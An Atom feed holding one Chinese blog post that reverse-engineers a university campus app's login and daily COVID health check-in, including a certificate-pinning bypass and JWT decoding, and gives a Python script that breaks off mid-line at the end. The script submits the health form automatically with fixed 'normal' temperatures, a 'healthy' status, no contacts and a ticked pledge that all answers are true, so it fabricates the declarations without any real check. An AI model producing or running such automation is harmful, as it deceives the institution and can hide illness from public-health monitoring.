<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>子墨的博客</title>
  
  <subtitle>总得让实力配上野心</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.zimo.wiki/"/>
  <updated>2022-05-04T02:56:01.510Z</updated>
  <id>https://blog.zimo.wiki/</id>
  
  <author>
    <name>子墨</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>超详细i至诚app打卡流程分析与自动打卡实现</title>
    <link href="https://blog.zimo.wiki/posts/5a29fa14/"/>
    <id>https://blog.zimo.wiki/posts/5a29fa14/</id>
    <published>2021-07-19T11:39:46.000Z</published>
    <updated>2022-05-04T02:56:01.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>受人之托，分析了一下i至诚app（是由<a href="http://www.supwisdom.com/" target="_blank" rel="noopener">树维公司</a>出的一款套壳app）的打卡流程，并实现了自动化，app版本是v1.1.2，记录一下</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><h3 id="app下载地址"><a href="#app下载地址" class="headerlink" title="app下载地址"></a>app下载地址</h3><p><a href="http://www.fdzcxy.edu.cn/ueditor/asp/upload/file/20200305/zcxy_v1_1_2.apk" target="_blank" rel="noopener">http://www.fdzcxy.edu.cn/ueditor/asp/upload/file/20200305/zcxy_v1_1_2.apk</a></p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>我使用的工具是<code>fiddler</code>，这个<code>app</code>本质上是一个<code>weex</code>构建的基于<code>vue</code>的套壳<code>app</code>项目，登陆时使用的是<code>okhttp框架 并有一定程度的证书校验</code>，因此抓包时用老办法（<code>hook okhttp</code>）绕过一下，然后局域网下设置好代理之后，就可以抓包了，过程不再赘述</p><h3 id="报文分析"><a href="#报文分析" class="headerlink" title="报文分析"></a>报文分析</h3><h4 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h4><p>i至诚使用的是<code>jwt token</code>认证</p><p>请求报文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST https://superapp.fdzcxy.edu.cn/auth-server/jwt/token/login?username=用户名&amp;password=密码 HTTP/1.1</span><br><span class="line">Content-Length: 0</span><br><span class="line">Host: superapp.fdzcxy.edu.cn</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">User-Agent: okhttp/3.12.1</span><br></pre></td></tr></table></figure><p>响应报文如下，登陆成功会返回<code>jwt token</code>，失败会直接<code>403</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200</span><br><span class="line">Server: nginx/1.16.1</span><br><span class="line">Date: Mon, 19 Jul 2021 07:27:01 GMT</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br><span class="line">Cache-Control: no-cache, no-store, max-age=0, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Expires: 0</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJSUzUxMiJ9eyJzdWIiOiLlrablj7ciLCJST0xFUyI6IlJPTEVfQURNSU4sYWRtaW5pc3RyYXRvcix1c2VyIiwiY3JlYXRlZCI6MTYyNjY5NjA1NTkzMiwiZXhwIjoxNjI5Mjg4MDU1fS5zaWduYXR1cmU=</span><br></pre></td></tr></table></figure><p>这里简单介绍一下<code>jwt</code>（是一种基于<code>token</code>的鉴权机制），<code>jwt token</code>通常由三部分构成，格式是这样的：<code>header.payload.signature</code></p><p>所以上面的响应可以直接解析为：</p><p>header：声明类型和加密的算法</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"alg"</span>:<span class="string">"RS512"</span>&#125;</span><br></pre></td></tr></table></figure><p>payload：存放有效信息</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">"sub": "学号",#subject，标识实体</span><br><span class="line">"ROLES": "ROLE_ADMIN,administrator,user",</span><br><span class="line">"created": 1626696055932,#创建时间</span><br><span class="line">"exp": 1629288055,#expire，过期时间</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>signature：可以理解为签名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是一串RSA私钥加密之后的密文，由于泄露个人信息，已打码处理</span><br></pre></td></tr></table></figure><p>分析登陆时其实可以不用抓包处理，因为树维公司其实提供了文档，链接：<a href="https://superapp.fdzcxy.edu.cn/auth-server/doc/index#%E7%99%BB%E5%BD%95" target="_blank" rel="noopener">https://superapp.fdzcxy.edu.cn/auth-server/doc/index#%E7%99%BB%E5%BD%95</a></p><p>然后文档中还顺带把公钥给我们了，基于此，顺带写了一个验签工具，并把之前抓包的<code>jwt token</code>解密出来了</p><p>该工具需要的maven依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>工具源代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyFactory;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.RSAPublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.InvalidKeySpecException;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.X509EncodedKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvalidKeySpecException, NoSuchAlgorithmException </span>&#123;</span><br><span class="line">        getClaimsFromToken(<span class="string">"你抓到的jwt token"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> RSAPublicKey <span class="title">stringToPublicKey</span><span class="params">(String publicKeyPem)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException </span>&#123;</span><br><span class="line">        <span class="comment">//System.out.println(publicKeyPem);</span></span><br><span class="line">        <span class="keyword">if</span> (publicKeyPem.startsWith(<span class="string">"-----BEGIN PUBLIC KEY-----"</span>)) &#123;</span><br><span class="line">            publicKeyPem = publicKeyPem.replaceAll(<span class="string">"-----BEGIN PUBLIC KEY-----"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (publicKeyPem.endsWith(<span class="string">"-----END PUBLIC KEY-----"</span>)) &#123;</span><br><span class="line">            publicKeyPem = publicKeyPem.replaceAll(<span class="string">"-----END PUBLIC KEY-----"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        publicKeyPem = publicKeyPem.replaceAll(<span class="string">"\n"</span>, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//System.out.println(publicKeyPem);</span></span><br><span class="line">        X509EncodedKeySpec x509KeySpec = <span class="keyword">new</span> X509EncodedKeySpec(Base64.getMimeDecoder().decode(publicKeyPem));</span><br><span class="line">        KeyFactory x509KeyFactory = KeyFactory.getInstance(<span class="string">"RSA"</span>);</span><br><span class="line">        RSAPublicKey x509PublicKey = (RSAPublicKey) x509KeyFactory.generatePublic(x509KeySpec);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x509PublicKey;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Key <span class="title">getPublicKey</span><span class="params">()</span> <span class="keyword">throws</span> InvalidKeySpecException, NoSuchAlgorithmException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String publicKeyPem = <span class="string">"-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBQw6TmvJ+nOuRaLoHsZJGIBzRg/wbskNv6UevL3/nQioYooptPfdIHVzPiKRVT5+DW5+nqzav3DOxY+HYKjO9nFjYdj0sgvRae6iVpa5Ji1wbDKOvwIDNukgnKbqvFXX2Isfl0RxeN3uEKdjeFGGFdr38I3ADCNKFNxtbmfqvjQIDAQAB -----END PUBLIC KEY-----"</span>;</span><br><span class="line"></span><br><span class="line">        Key publicKey = stringToPublicKey(publicKeyPem);</span><br><span class="line">        <span class="keyword">return</span> publicKey;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> Claims <span class="title">getClaimsFromToken</span><span class="params">(String token)</span> <span class="keyword">throws</span> InvalidKeySpecException, NoSuchAlgorithmException </span>&#123;</span><br><span class="line">        Key publicKey = getPublicKey();</span><br><span class="line"></span><br><span class="line">        Claims claims;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            claims = Jwts.parser().setSigningKey(publicKey).parseClaimsJws(token).getBody();</span><br><span class="line">            System.out.println(claims);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            claims = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> claims;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密出来的明文如下：其实就是把payload加密了一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;sub=学号, ROLES=ROLE_ADMIN,administrator,user, created=1626696055932, exp=1629288055&#125;</span><br></pre></td></tr></table></figure><h4 id="每日健康上报"><a href="#每日健康上报" class="headerlink" title="每日健康上报"></a>每日健康上报</h4><p>在i至诚app中，除了登陆，几乎其他所有的功能都是用<code>webview</code>加载的<code>vue</code>项目，每日健康上报功能也是这样，而在这些应用中，几乎都没有证书验证，因此可以直接抓包，或者在浏览器中访问，所以这里最简单的方式，当然是无脑的使用自动化测试框架啦（虽然慢是慢点，因为浏览器渲染是一个比较耗时的操作），我并没有采用这种方式，我选择的是直接分析整个流程，然后模拟提交，不依赖浏览器的渲染</p><p>大体上有这么几个过程：<code>请求每日健康上报</code> -&gt; <code>重定向并获取sessionID</code> -&gt; <code>激活sessionid</code> -&gt; <code>获取打卡信息，jsConfId和callbackConfId</code> -&gt; <code>提交打卡信息</code></p><h3 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h3><p>经过上面的分析，最终的成品如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">username = <span class="string">'学号'</span></span><br><span class="line">password = <span class="string">'密码'</span></span><br><span class="line">name = <span class="string">'姓名'</span></span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">r'[a-zA-Z0-9]&#123;8&#125;-[a-zA-Z0-9]&#123;4&#125;-[a-zA-Z0-9]&#123;4&#125;-[a-zA-Z0-9]&#123;4&#125;-[a-zA-Z0-9]&#123;12&#125;'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://superapp.fdzcxy.edu.cn/auth-server/jwt/token/login'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'superapp.fdzcxy.edu.cn'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'Keep-Alive'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'okhttp/3.12.1'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    <span class="comment"># print(res.text)</span></span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">daka</span><span class="params">(token)</span>:</span></span><br><span class="line">    <span class="comment"># 请求每日健康上报，获取必要的信息</span></span><br><span class="line">    url = <span class="string">'http://dw10.fdzcxy.edu.cn/datawarn/home/handle.action?redirectUrl=app/yibao.frm'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'dw10.fdzcxy.edu.cn'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 SuperApp'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'</span>,</span><br><span class="line">        <span class="string">'authorization'</span>: <span class="string">'JWTToken '</span> + token,</span><br><span class="line">        <span class="string">'usertoken'</span>: token,</span><br><span class="line">        <span class="string">'jwttoken'</span>: token,</span><br><span class="line">        <span class="string">'X-Requested-With'</span>: <span class="string">'com.lantu.MobileCampus.zcxy'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>: <span class="string">'userToken='</span> + token</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    url = <span class="string">'http://dw10.fdzcxy.edu.cn/'</span> + res.headers[<span class="string">'location'</span>]</span><br><span class="line">    reffer = url</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取sessionID</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    sessionID = pattern.search(res.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(sessionID)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新JSESSIONID</span></span><br><span class="line">    url = <span class="string">'http://dw10.fdzcxy.edu.cn/datawarn/decision/resources?path=/com/fr/web/core/js/vancharts-all.js&amp;deviceType=iPhone&amp;buildVersion=2020.12.02.10.19.36.340'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'dw10.fdzcxy.edu.cn'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    cookie = <span class="string">'JSESSIONID='</span> + requests.utils.dict_from_cookiejar(res.cookies)[<span class="string">'JSESSIONID'</span>]</span><br><span class="line">    <span class="comment"># print(cookie)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 激活sessionid的必要步骤</span></span><br><span class="line">    url = <span class="string">'http://dw10.fdzcxy.edu.cn/datawarn/decision/url/mobile/view/firstdata?op=h5&amp;cmd=firstdata&amp;userno='</span> + username + <span class="string">'&amp;token='</span> + token + <span class="string">'&amp;__parameters__=&#123;&#125;&amp;sessionID='</span> + sessionID</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'dw10.fdzcxy.edu.cn'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'responseType'</span>: <span class="string">'json'</span>,</span><br><span class="line">        <span class="string">'terminal'</span>: <span class="string">'H5'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'__device__'</span>: <span class="string">'unknown'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">        <span class="string">'clientType'</span>: <span class="string">'mobile/h5_5.0'</span>,</span><br><span class="line">        <span class="string">'deviceType'</span>: <span class="string">'unknown'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="comment"># print(res.text)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取打卡信息，jsConfId和callbackConfId</span></span><br><span class="line">    url = <span class="string">'http://dw10.fdzcxy.edu.cn/datawarn/decision/view/form?sessionID='</span> + sessionID + <span class="string">'&amp;op=fr_form&amp;cmd=load_content&amp;toVanCharts=true&amp;fine_api_v_json=3&amp;widgetVersion=1'</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="comment"># print(res.text)</span></span><br><span class="line">    <span class="comment"># 不嫌麻烦的话，可以写一个逻辑构建打卡所需要提交的表单，这里我就偷懒了</span></span><br><span class="line">    items = res.json()[<span class="string">'items'</span>][<span class="number">0</span>][<span class="string">'el'</span>][<span class="string">'items'</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="string">'widgetName'</span>] == <span class="string">'SUBMIT'</span>:</span><br><span class="line">            submit = i[<span class="string">'listeners'</span>][<span class="number">0</span>][<span class="string">'action'</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(submit)</span></span><br><span class="line">    jsConfId = pattern.findall(submit)[<span class="number">0</span>]</span><br><span class="line">    callbackConfId = pattern.findall(submit)[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print(jsConfId, callbackConfId)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提交打卡信息</span></span><br><span class="line">    url = <span class="string">'http://dw10.fdzcxy.edu.cn/datawarn/decision/view/form'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'dw10.fdzcxy.edu.cn'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'terminal'</span>: <span class="string">'H5'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'__device__'</span>: <span class="string">'unknown'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">        <span class="string">'sessionID'</span>: sessionID,</span><br><span class="line">        <span class="string">'clientType'</span>: <span class="string">'mobile/h5_5.0'</span>,</span><br><span class="line">        <span class="string">'deviceType'</span>: <span class="string">'unknown'</span>,</span><br><span class="line">        <span class="string">'Origin'</span>: <span class="string">'http://dw10.fdzcxy.edu.cn'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: reffer,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'op'</span>: <span class="string">'dbcommit'</span>,</span><br><span class="line">        <span class="string">'__parameters__'</span>: quote(</span><br><span class="line">            <span class="string">'&#123;"jsConfId":"'</span> + jsConfId + <span class="string">'","callbackConfId":"'</span> + callbackConfId + <span class="string">'","LABEL2":"  每日健康上报","XH":"'</span> + username + <span class="string">'","XM":"'</span> + name + <span class="string">'","LABEL12":"","LABEL0":"1. 目前所在位置:","SHENG":"350000","SHI":"福州市","QU":"鼓楼区","LABEL11":"2.填报时间:","SJ":"'</span> + time.strftime(</span><br><span class="line">                <span class="string">"%Y-%m-%d %H:%M:%S"</span>,</span><br><span class="line">                time.localtime()) + <span class="string">'","LABEL1":"3. 今日体温是否正常？(体温小于37.3为正常)","TWZC":"正常","LABEL6":"目前体温为：","TW":"0","TXWZ":"350000福州市鼓楼区","LABEL9":"4. 昨日午检体温:","WUJ":"36.4","LABEL8":"5. 昨日晚检体温:","WJ":"36.5","LABEL10":"6. 今日晨检体温:","CJ":"36.4","LABEL3":"7. 今日健康状况？","JK":["健康"],"JKZK":"","QTB":"请输入具体症状：","QT":" ","LABEL4":"8. 近14日你和你的共同居住者(包括家庭成员、共同租住的人员)是否存在确诊、疑似、无症状新冠感染者？","WTSQK":["无以下特殊情况"],"SFXG":"","LABEL5":"9. 今日隔离情况？","GLQK":"无需隔离","LABEL7":"* 本人承诺以上所填报的内容全部真实，并愿意承担相应责任。","CHECK":true,"DWWZ":&#123;&#125;,"SUBMIT":"提交信息"&#125;'</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">if</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span><span class="params">(event, context)</span>:</span></span><br><span class="line">    token = login()</span><br><span class="line">    <span class="comment"># print(token)</span></span><br><span class="line">    <span class="keyword">if</span> daka(token):</span><br><span class="line">        <span class="keyword">return</span> <span 